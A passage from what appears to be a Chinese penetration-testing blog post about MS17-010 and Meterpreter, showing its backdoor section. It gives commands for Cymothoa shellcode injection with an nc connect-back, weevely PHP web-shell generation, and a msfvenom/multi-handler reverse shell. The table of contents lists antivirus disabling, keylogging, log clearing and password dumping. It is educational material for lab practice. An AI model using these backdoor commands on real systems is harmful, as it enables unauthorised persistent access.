<h2 id="五：后门"><a href="#五：后门" class="headerlink" title="五：后门"></a>五：后门</h2><h3 id="1：Cymothoa-后门"><a href="#1：Cymothoa-后门" class="headerlink" title="1：Cymothoa 后门"></a>1：Cymothoa 后门</h3><p>Cymothoa 工具可以把 ShellCode 注入现有进程，伪装成常规程序<br>用法如下：<br>1：使用-p 参数设置目标进程的 pid<br>2：使用-s 参数指定 ShellCode 的编号，查看所有 ShellCode 的编号使用命令：cymothoa -s<br>3：使用-y 参数指定 Payload 服务端口号<br>完整命令示例：cymothoa -p 100 -s 1 -y 4444<br>注入成功后可以使用如下命令来连接目标主机的后门，等待返回 shell<br>Nc -nvv 目标主机 IP 4444</p>
<h3 id="2：weevely"><a href="#2：weevely" class="headerlink" title="2：weevely"></a>2：weevely</h3><p>用法如下：<br>1&gt;：生成后门<br>命令：weevely generate password/存放路径/try.php<br>生成一个名为 try.php 的后门，密码为 password<br>2&gt;：上传后门至 web 根目录下/var/www/html/（上传命令在之前的文件命令讲过，不再赘述）<br>3&gt;：连接后门<br>命令：weevely 目标主机 IP/shell 所在目录/1.php password（密码）<br>weevely 还可以生成图片后门。同时 weevely 还有多个模块使用，在连接上后门之后按两次 Tab 键，可以查看可利用的模块</p>
<h3 id="3：meterpreter-后门"><a href="#3：meterpreter-后门" class="headerlink" title="3：meterpreter 后门"></a>3：meterpreter 后门</h3><p>用法如下：<br>1&gt;：使用使用 msfvenom 创建 shell，shell 的类型可以自己选自，可以为 php 文件，exe 文件等等<br>注：php 文件可以放在 web 根目录下，方便直接启动<br>2&gt;： 上传 shell 到目标服务器（上传命令在之前的文件命令讲过，不再赘述）<br>3&gt;：在 msf 下设置监听模块，开始监听，设置方法为：<br>①：use exploit/multi//handler<br>②：set payload （payload 可以自行选择）<br>③：访问或运行 shell<br>④：获得目标主机反弹的 shell，连接建立<br>这里以一个 exe 文件为例，大家可以尝试其他 web 文件<br>1&gt;：创建 shell<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1595418331390-8f15e69e-d099-4a7f-ac4b-2cc216e7dd64.png#align=left&display=inline&height=137&margin=%5Bobject%20Object%5D&originHeight=137&originWidth=906&size=0&status=done&style=none&width=906"><br>2&gt;：上传 shell<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1595418334656-ec607796-9a81-4024-900a-776a2e0bbc8a.png#align=left&display=inline&height=103&margin=%5Bobject%20Object%5D&originHeight=103&originWidth=546&size=0&status=done&style=none&width=546"><br>3&gt;：设置监听模块，开始监听<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1595418337797-5087cead-8008-460c-8fb2-8f7333a67fcd.png#align=left&display=inline&height=316&margin=%5Bobject%20Object%5D&originHeight=316&originWidth=820&size=0&status=done&style=none&width=820"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Cyberangel</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://cyberangel.cn/2020/07/22/Windows%20MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%EF%BC%89%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/">https://cyberangel.cn/2020/07/22/Windows%20MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%EF%BC%89%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://cyberangel.cn" target="_blank">Cyberangel-blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/07/30/PWN%E5%85%A5%E9%97%A8%EF%BC%881-2%EF%BC%89-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%88strcpy%EF%BC%89/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">PWN入门（1-2）-缓冲区溢出之栈溢出（strcpy）</div></div></a></div><div class="next-post pull-right"><a href="/2020/07/21/C++%E4%B8%ADmain%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0argv%5B%5D%E3%80%81%E5%92%8Catoi()%E5%87%BD%E6%95%B0%E8%AE%B2%E8%A7%A3/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">C++中main函数参数argv[]、和atoi()函数讲解</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Cyberangel</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">317</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">2.</span> <span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E5%B7%A5%E5%85%B7"><span class="toc-number">3.</span> <span class="toc-text">复现工具</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E5%A4%8D%E7%8E%B0"><span class="toc-number">4.</span> <span class="toc-text">开始复现</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#meterpreter-%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8"><span class="toc-number">5.</span> <span class="toc-text">meterpreter 的简单使用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E5%BC%80%E5%90%AF-Windows-%E9%9D%B6%E6%9C%BA-system-%E6%9D%83%E9%99%90%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C"><span class="toc-number">5.1.</span> <span class="toc-text">1、开启 Windows 靶机 system 权限的命令行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E5%AF%B9%E9%9D%B6%E6%9C%BA%E8%BF%9B%E8%A1%8C%E6%88%AA%E5%9B%BE%E7%9B%91%E6%8E%A7"><span class="toc-number">5.2.</span> <span class="toc-text">2、对靶机进行截图监控</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E8%8E%B7%E5%8F%96%E6%8C%89%E9%94%AE%E4%BF%A1%E6%81%AF%EF%BC%9A"><span class="toc-number">5.3.</span> <span class="toc-text">3、获取按键信息：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E6%B8%85%E9%99%A4%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97"><span class="toc-number">5.4.</span> <span class="toc-text">4、清除事件日志</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%99%84%EF%BC%9A%E5%B8%B8%E7%94%A8%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-number">6.</span> <span class="toc-text">附：常用的命令</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%EF%BC%9A%E8%BF%9B%E7%A8%8B%E8%BF%81%E7%A7%BB"><span class="toc-number">6.1.</span> <span class="toc-text">一：进程迁移</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%EF%BC%9A%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E6%AD%A3%E5%9C%A8%E8%BF%90%E8%A1%8C%E7%9A%84%E8%BF%9B%E7%A8%8B"><span class="toc-number">6.1.1.</span> <span class="toc-text">1：获取目标主机正在运行的进程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%EF%BC%9A%E6%9F%A5%E7%9C%8B-meterpreter-shell-%E7%9A%84%E8%BF%9B%E7%A8%8B%E5%8F%B7"><span class="toc-number">6.1.2.</span> <span class="toc-text">2：查看 meterpreter shell 的进程号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%EF%BC%9A%E8%BF%9B%E7%A8%8B%E8%BF%81%E7%A7%BB-%EF%BC%88%E5%85%88%E6%89%BE%E4%B8%80%E4%B8%AA%E7%A8%B3%E5%AE%9A%E7%9A%84%E5%B7%B2%E6%89%93%E5%BC%80%E7%9A%84%E7%9A%84%E5%BA%94%E7%94%A8%E8%BF%9B%E7%A8%8B%EF%BC%89"><span class="toc-number">6.1.3.</span> <span class="toc-text">3：进程迁移 （先找一个稳定的已打开的的应用进程）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%EF%BC%9A%E8%87%AA%E5%8A%A8%E8%BF%9B%E8%A1%8C%E8%BF%9B%E7%A8%8B%E8%BF%81%E7%A7%BB-%EF%BC%88%E7%B3%BB%E7%BB%9F%E4%BC%9A%E8%87%AA%E5%8A%A8%E5%AF%BB%E6%89%BE%E5%90%88%E9%80%82%E7%9A%84%E8%BF%9B%E7%A8%8B%E8%BF%9B%E8%A1%8C%E8%BF%81%E7%A7%BB%EF%BC%89"><span class="toc-number">6.1.4.</span> <span class="toc-text">4：自动进行进程迁移 （系统会自动寻找合适的进程进行迁移）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%EF%BC%9A%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">6.2.</span> <span class="toc-text">二：系统命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%EF%BC%9A%E6%9F%A5%E7%9C%8B%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">6.2.1.</span> <span class="toc-text">1：查看系统信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%EF%BC%9A%E6%9F%A5%E7%9C%8B%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E8%BF%90%E8%A1%8C%E6%97%B6%E9%97%B4"><span class="toc-number">6.2.2.</span> <span class="toc-text">2：查看目标主机运行时间</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%EF%BC%9A%E6%9F%A5%E7%9C%8B%E7%9B%AE%E6%A0%87%E6%9C%BA%E6%98%AF%E5%90%A6%E8%BF%90%E8%A1%8C%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8A"><span class="toc-number">6.2.3.</span> <span class="toc-text">3：查看目标机是否运行在虚拟机上</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%EF%BC%9A%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E4%B8%BB%E6%9C%BA%E7%94%A8%E6%88%B7%E5%90%8D%E5%8F%8A%E5%85%B6%E6%9D%83%E9%99%90"><span class="toc-number">6.2.4.</span> <span class="toc-text">4：查看当前主机用户名及其权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%EF%BC%9A%E5%85%B3%E9%97%AD%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6"><span class="toc-number">6.2.5.</span> <span class="toc-text">5：关闭杀毒软件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6%EF%BC%9A%E5%90%AF%E5%8A%A8%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E7%9A%84-3389-%E7%AB%AF%E5%8F%A3%E5%8D%B3%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E5%8D%8F%E8%AE%AE"><span class="toc-number">6.2.6.</span> <span class="toc-text">6：启动目标主机的 3389 端口即远程桌面协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7%EF%BC%9A%E5%B0%86%E5%BD%93%E5%89%8D%E4%BC%9A%E8%AF%9D%E6%94%BE%E5%88%B0%E5%90%8E%E5%8F%B0"><span class="toc-number">6.2.7.</span> <span class="toc-text">7：将当前会话放到后台</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8%EF%BC%9A%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">6.2.8.</span> <span class="toc-text">8：端口转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9%EF%BC%9A%E8%B7%AF%E7%94%B1-route-%E6%93%8D%E4%BD%9C"><span class="toc-number">6.2.9.</span> <span class="toc-text">9：路由 route 操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10%EF%BC%9A%E5%85%B3%E9%97%AD%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6"><span class="toc-number">6.2.10.</span> <span class="toc-text">10：关闭杀毒软件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11%EF%BC%9A%E5%88%97%E4%B8%BE%E5%BD%93%E5%89%8D%E7%9B%AE%E6%A0%87%E6%9C%BA%E6%9C%89%E5%A4%9A%E5%B0%91%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95"><span class="toc-number">6.2.11.</span> <span class="toc-text">11：列举当前目标机有多少用户登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12%EF%BC%9A%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7"><span class="toc-number">6.2.12.</span> <span class="toc-text">12：添加用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#13%EF%BC%9A%E6%8A%93%E5%8F%96%E7%9B%AE%E6%A0%87%E6%9C%BA%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE"><span class="toc-number">6.2.13.</span> <span class="toc-text">13：抓取目标机的屏幕截图</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#14%EF%BC%9Awebcam-%E6%91%84%E5%83%8F%E5%A4%B4%E5%91%BD%E4%BB%A4"><span class="toc-number">6.2.14.</span> <span class="toc-text">14：webcam 摄像头命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#15%EF%BC%9A%E8%BF%9B%E5%85%A5%E7%9B%AE%E6%A0%87%E6%9C%BA-shell%EF%BC%8C%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E7%9A%84%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E8%A1%8C"><span class="toc-number">6.2.15.</span> <span class="toc-text">15：进入目标机 shell，获取目标主机的远程命令行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%EF%BC%9A%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">6.3.</span> <span class="toc-text">三：文件系统命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%EF%BC%9A%E5%85%B6%E4%BB%96%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">6.4.</span> <span class="toc-text">四：其他常用命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%EF%BC%9Asession-%E5%91%BD%E4%BB%A4"><span class="toc-number">6.4.1.</span> <span class="toc-text">1：session 命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%EF%BC%9Atimestomp-%E4%BC%AA%E9%80%A0%E6%97%B6%E9%97%B4%E6%88%B3"><span class="toc-number">6.4.2.</span> <span class="toc-text">2：timestomp 伪造时间戳</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%EF%BC%9A%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%99%A8%E5%8A%9F%E8%83%BD-keyscan"><span class="toc-number">6.4.3.</span> <span class="toc-text">3：键盘记录器功能 keyscan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%EF%BC%9A%E7%B3%BB%E7%BB%9F%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96"><span class="toc-number">6.4.4.</span> <span class="toc-text">4：系统账号密码获取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%EF%BC%9Aedit-%E5%91%BD%E4%BB%A4"><span class="toc-number">6.4.5.</span> <span class="toc-text">5：edit 命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6%EF%BC%9Aexecute-%E5%91%BD%E4%BB%A4"><span class="toc-number">6.4.6.</span> <span class="toc-text">6：execute 命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7%EF%BC%9A%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">6.4.7.</span> <span class="toc-text">7：信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">6.4.8.</span> <span class="toc-text">8：权限提升</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9%EF%BC%9A%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83%EF%BC%9A"><span class="toc-number">6.4.9.</span> <span class="toc-text">9：漏洞提权：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10%EF%BC%9A-%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81"><span class="toc-number">6.4.10.</span> <span class="toc-text">10： 抓取密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11%EF%BC%9A%E4%BB%A4%E7%89%8C%E6%AC%BA%E9%AA%97"><span class="toc-number">6.4.11.</span> <span class="toc-text">11：令牌欺骗</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%EF%BC%9A%E5%90%8E%E9%97%A8"><span class="toc-number">6.5.</span> <span class="toc-text">五：后门</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%EF%BC%9ACymothoa-%E5%90%8E%E9%97%A8"><span class="toc-number">6.5.1.</span> <span class="toc-text">1：Cymothoa 后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%EF%BC%9Aweevely"><span class="toc-number">6.5.2.</span> <span class="toc-text">2：weevely</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%EF%BC%9Ameterpreter-%E5%90%8E%E9%97%A8"><span class="toc-number">6.5.3.</span> <span class="toc-text">3：meterpreter 后门</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/06/10/%E5%88%A9%E7%94%A8mprotect%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E6%AE%B5%E6%9D%83%E9%99%90%E4%B8%BA%E5%8F%AF%E6%89%A7%E8%A1%8C/" title="利用mprotect修改程序段权限为可执行"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="利用mprotect修改程序段权限为可执行"/></a><div class="content"><a class="title" href="/2021/06/10/%E5%88%A9%E7%94%A8mprotect%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E6%AE%B5%E6%9D%83%E9%99%90%E4%B8%BA%E5%8F%AF%E6%89%A7%E8%A1%8C/" title="利用mprotect修改程序段权限为可执行">利用mprotect修改程序段权限为可执行</a><time datetime="2021-06-10T07:59:46.000Z" title="发表于 2021-06-10 15:59:46">2021-06-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/31/SROP%EF%BC%881%EF%BC%89--%E4%BB%8E%E4%B8%A4%E9%81%93%E9%A2%98%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86SROP%20attack/" title="SROP（1）--从两道题重新认识SROP attack"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SROP（1）--从两道题重新认识SROP attack"/></a><div class="content"><a class="title" href="/2021/05/31/SROP%EF%BC%881%EF%BC%89--%E4%BB%8E%E4%B8%A4%E9%81%93%E9%A2%98%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86SROP%20attack/" title="SROP（1）--从两道题重新认识SROP attack">SROP（1）--从两道题重新认识SROP attack</a><time datetime="2021-05-31T02:14:53.000Z" title="发表于 2021-05-31 10:14:53">2021-05-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/18/how2heap(14)-unsortedbin%20attack/" title="how2heap(14)-unsortedbin attack"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="how2heap(14)-unsortedbin attack"/></a><div class="content"><a class="title" href="/2021/05/18/how2heap(14)-unsortedbin%20attack/" title="how2heap(14)-unsortedbin attack">how2heap(14)-unsortedbin attack</a><time datetime="2021-05-18T07:48:53.000Z" title="发表于 2021-05-18 15:48:53">2021-05-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/17/how2heap(13)-tcache_stashing_unlink_attack/" title="how2heap(13)-tcache_stashing_unlink_attack"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="how2heap(13)-tcache_stashing_unlink_attack"/></a><div class="content"><a class="title" href="/2021/05/17/how2heap(13)-tcache_stashing_unlink_attack/" title="how2heap(13)-tcache_stashing_unlink_attack">how2heap(13)-tcache_stashing_unlink_attack</a><time datetime="2021-05-17T02:16:40.000Z" title="发表于 2021-05-17 10:16:40">2021-05-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/14/how2heap(12)-house%20of%20lore/" title="how2heap(12)-house of lore"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="how2heap(12)-house of lore"/></a><div class="content"><a class="title" href="/2021/05/14/how2heap(12)-house%20of%20lore/" title="how2heap(12)-house of lore">how2heap(12)-house of lore</a><time datetime="2021-05-14T08:02:54.000Z" title="发表于 2021-05-14 16:02:54">2021-05-14</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Cyberangel</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>